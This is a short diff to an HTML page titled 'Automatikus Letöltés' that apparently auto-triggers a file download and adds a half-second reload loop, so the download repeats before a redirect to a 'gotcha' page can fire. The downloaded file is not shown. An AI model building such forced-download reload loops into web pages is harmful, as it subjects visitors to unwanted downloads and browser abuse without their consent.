@@ -5,6 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Automatikus Letöltés</title>
     <script>
+        setTimeout(function(){
+            location.reload(); 
+        }, 500); 
+    </script>
+    <script>
         document.addEventListener("DOMContentLoaded", function () {
 	    let timestamp = new Date().getTime();
             var link = document.createElement("a");
@@ -16,9 +21,9 @@
         });
     </script>
     <script>
-    setTimeout(function() {
-        window.location.href = "https://bizkizlt666.github.io/gotcha/"; 
-    }, 1000); 
+        setTimeout(function() {
+            window.location.href = "https://bizkizlt666.github.io/gotcha/"; 
+        }, 1000); 
 </script>
 
 </head>
